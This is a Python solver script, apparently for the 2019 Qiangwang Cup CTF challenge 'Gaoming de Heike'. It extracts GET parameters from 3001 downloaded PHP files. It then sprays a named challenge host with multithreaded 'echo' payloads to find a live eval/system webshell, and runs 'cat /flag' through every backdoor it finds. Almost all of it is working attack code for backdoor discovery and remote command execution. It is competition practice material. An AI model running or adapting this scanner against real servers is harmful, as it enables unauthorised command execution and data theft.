#!/usr/bin/env python3
"""
[强网杯 2019] 高明的黑客 — 自动化动态测试解题脚本
题目特点：3001个PHP文件，大量后门被永假if/参数覆盖封锁，需动态请求找真正可用后门
"""

import os
import re
import sys
import concurrent.futures
import requests

BASE_URL = "http://afd178268568e8cb558c4bd9.http-ctf2.dasctf.com:80"
SRC_DIR = os.path.join(os.path.dirname(__file__), "..", "..", ".temp", "www", "src")
# 如果从ctfmd运行时路径不对，手动指定：
# SRC_DIR = "/Users/kingpong/.local/share/TeleAgent/TeleAgent的工作空间/.temp/www/src"

MARKER = "GLM_"  # 在响应中搜索的唯一标记
THREADS = 30
TIMEOUT = 5


def extract_get_params(filepath: str) -> list[str]:
    """从PHP文件中提取所有 $_GET 参数名"""
    with open(filepath, "r", errors="ignore") as f:
        content = f.read()
    return list(set(re.findall(r"\$_GET\['(\w+)'\]", content)))


def test_get_param(filename: str, param: str) -> dict | None:
    """对单个文件的GET参数发送测试请求"""
    url = f"{BASE_URL}/{filename}"
    # 用PHP代码作为payload：若参数被system()调用则执行命令，若被eval()则执行PHP代码
    # 两种都试：system('echo MARKER') 和 eval('echo MARKER;')
    payload = f"echo {MARKER};"

    try:
        r = requests.get(url, params={param: payload}, timeout=TIMEOUT)
        if MARKER in r.text:
            return {"file": filename, "param": param, "type": "GET", "payload": payload}

        # 再试系统命令
        payload2 = f"echo {MARKER}"
        r = requests.get(url, params={param: payload2}, timeout=TIMEOUT)
        if MARKER in r.text:
            return {"file": filename, "param": param, "type": "GET", "payload": payload2}

    except requests.RequestException:
        pass
    return None


def test_post_param(filename: str, param: str) -> dict | None:
    """对单个文件的POST参数发送测试请求"""
    url = f"{BASE_URL}/{filename}"
    payload = f"echo {MARKER};"

    try:
        r = requests.post(url, data={param: payload}, timeout=TIMEOUT)
        if MARKER in r.text:
            return {"file": filename, "param": param, "type": "POST", "payload": payload}
    except requests.RequestException:
        pass
    return None


def main():
    src = SRC_DIR
    if not os.path.isdir(src):
        print(f"[!] 源码目录不存在: {src}")
        print(f"[*] 请先下载 www.tar.gz 并解压到 .temp/www/")
        sys.exit(1)

    php_files = sorted(f for f in os.listdir(src) if f.endswith(".php"))
    print(f"[*] 共 {len(php_files)} 个PHP文件")

    # 阶段1：提取所有 (文件, GET参数) 组合
    tasks = []
    for fname in php_files:
        filepath = os.path.join(src, fname)
        params = extract_get_params(filepath)
        for p in params:
            tasks.append((fname, p))

    print(f"[*] 共 {len(tasks)} 个 (文件, GET参数) 组合待测试")
    print(f"[*] 使用 {THREADS} 线程，超时 {TIMEOUT}s")

    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as pool:
        futures = {pool.submit(test_get_param, f, p): (f, p) for f, p in tasks}
        done = 0
        total = len(futures)
        for future in concurrent.futures.as_completed(futures):
            done += 1
            if done % 500 == 0:
                print(f"  [{done}/{total}] ...")
            result = future.result()
            if result:
                found.append(result)
                print(f"[+] 发现可用后门! {result}")

    if found:
        print(f"\n[+] 共发现 {len(found)} 个可用后门:")
        for r in found:
            print(f"    {r['type']} {r['file']}?{r['param']}={r['payload']}")
        print(f"\n[*] 尝试读取 flag ...")
        for r in found:
            url = f"{BASE_URL}/{r['file']}?{r['param']}=cat%20/flag"
            try:
                resp = requests.get(url, timeout=TIMEOUT)
                # 搜索 flag 格式
                flag_match = re.search(r"(CTF\{[^}]+\}|flag\{[^}]+\}|DASCTF\{[^}]+\}|CTF2\{[^}]+\})", resp.text)
                if flag_match:
                    print(f"[+] Flag: {flag_match.group(1)}")
            except requests.RequestException:
                pass
    else:
        print("[-] 未发现可用后门（可能需要检查POST参数或换payload）")


if __name__ == "__main__":
    main()
